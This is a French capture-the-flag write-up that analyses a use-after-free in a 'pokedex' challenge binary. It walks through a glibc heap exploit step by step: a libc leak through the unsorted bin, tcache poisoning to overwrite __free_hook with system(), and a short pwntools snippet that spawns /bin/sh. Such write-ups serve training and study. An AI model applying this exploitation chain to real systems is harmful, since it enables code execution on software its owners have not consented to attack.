# Pokedex : Analyse Avancée d'un Use-After-Free (UAF) sur le Heap

## 1. Phase Préliminaire : Audit et Fingerprinting

Tout engagement professionnel commence par une identification rigoureuse de la cible. L'expertise ici réside dans la compréhension des primitives de sécurité actives.

### Commandes Initiales :
```bash
# Identification du format de fichier et de l'architecture
$ file pokedex
pokedex: ELF 64-bit LSB shared object, x86-64, version 1 (SYSV), dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, for GNU/Linux 3.2.0, BuildID[sha1]=..., stripped

# Analyse des protections binaires
$ checksec --file=pokedex
[*] 'pokedex'
    Arch:     amd64-64-little
    RELRO:    Full RELRO
    Stack:    Canary found
    NX:       NX enabled
    PIE:      PIE enabled
```

**Analyse de l'expert :**
Le binaire est en **Full RELRO**, ce qui signifie que la table GOT (`Global Offset Table`) est en lecture seule après le chargement. Oubliez les `GOT Overwrite` classiques. Le **PIE** (Position Independent Executable) impose de leaker une adresse de base pour toute adresse statique. Le **Canary** et le **NX** interdisent respectivement les débordements de pile simples et l'exécution de code sur la pile. L'attaque se portera donc sur le **Tas (Heap)**.

---

## 2. Rétro-ingénierie : Localisation de la Faille

En utilisant **Ghidra** pour la décompilation, nous isolons la logique de gestion des Pokémons. Le programme gère une table globale de pointeurs `pokedex_slots[10]`.

### Code Désassemblé (Zone Critique - `release`) :
Voici à quoi ressemble la fonction vulnérable une fois désassemblée avec `objdump -M intel -d pokedex` :

```nasm
<release>:
  ...
  call   get_slot_index          ; Récupère l'index du slot
  mov    rax, [rbp-0x8]          ; Charge l'index
  lea    rdx, [rax*8]            ; Calcule le décalage dans la table
  lea    rax, pokedex_slots      ; Adresse de la table globale
  mov    rax, [rdx+rax]          ; rax = pokedex_slots[index]
  
  test   rax, rax                ; Vérifie si le pointeur est NULL
  jz     error_exit
  
  mov    rdi, rax                ; rdi = pointeur vers le Pokémon
  call   free@plt                ; Libération de la mémoire
  
  ; --- ERREUR DE LOGIQUE ICI ---
  ; L'instruction 'mov qword ptr [rdx+rax], 0' est manquante.
  ; Le pointeur reste dans la table pokedex_slots !
  ...
```

### Analyse de la de la Vulnérabilité (Decomp C-Style) :
```c
void release() {
    int index = get_index();
    if (pokedex_slots[index] != NULL) {
        free(pokedex_slots[index]); // Libération du chunk sur le tas
        // VULNÉRABILITÉ : pokedex_slots[index] n'est pas mis à NULL !
        // C'est un Use-After-Free (UAF) classique.
    }
}
```

---

## 3. Vecteur d'Exploitation : Manipulation du Heap

L'expertise consiste ici à manipuler l'allocateur `ptmalloc` de la Glibc (version 2.27, qui utilise le `tcache`).

### Étape 1 : Leak de la Glibc (Unsorted Bin bypass)
Puisque le PIE et l'ASLR sont actifs, nous devons trouver l'adresse de la Libc.
1.  **Allocation** d'un chunk de taille `0x420` (suffisamment grand pour ne pas aller dans le tcache).
2.  **Libération** du chunk. Comme il est grand, il est placé dans l'**unsorted bin**.
3.  Dans l'unsorted bin, les chunks libérés contiennent des pointeurs vers la `main_arena` de la Libc.
4.  **Lecture (UAF)** : On appelle `inspect()` sur ce slot. Le programme affiche le contenu "libéré", nous révélant une adresse Libc.

### Étape 2 : Tcache Poisoning (Arbitrary Write)
Le `tcache` stocke les chunks libérés dans une liste simplement chaînée. Le premier mot d'un chunk libéré est le pointeur `next`.
1.  Libérer deux chunks de taille `0x60` (Slot 2 et Slot 3).
2.  La liste ressemble à : `Tcache[0x70] -> Slot 2 -> Slot 3`.
3.  **UAF Edit** : On utilise `edit(2, ...)` pour modifier le pointeur `next` du Slot 2 et le faire pointer vers `__free_hook`.
4.  La liste devient : `Tcache[0x70] -> Slot 2 -> __free_hook`.
5.  On alloue deux fois. La deuxième allocation nous renvoie un pointeur sur `__free_hook`.

### Étape 3 : Capture du Flag
Nous remplaçons le pointeur dans `__free_hook` par l'adresse de `system()`.
```python
# Payload finale via pwntools
edit(io, 2, 0x60, p64(libre_hook)) # Poisoning
catch(io, 4, 0x60, b'junk')        # Sortie du tcache
catch(io, 5, 0x60, p64(system_addr)) # Ecrasement du hook
```
Enfin, on crée un Pokémon contenant `/bin/sh` et on appelle `release()`. Le système exécute `system("/bin/sh")`.

---

## 4. Conclusion Technique
Cette exploitation démontre que même avec toutes les protections binaires (Full RELRO, PIE, Canary, NX), une simple erreur de gestion de pointeur sur le Tas suffit à compromettre l'intégralité d'un système. La rigueur dans la mise à jour des structures de données post-libération est la seule défense viable.

**Auteur : LWa7ch - Cybersecurity Engineer**
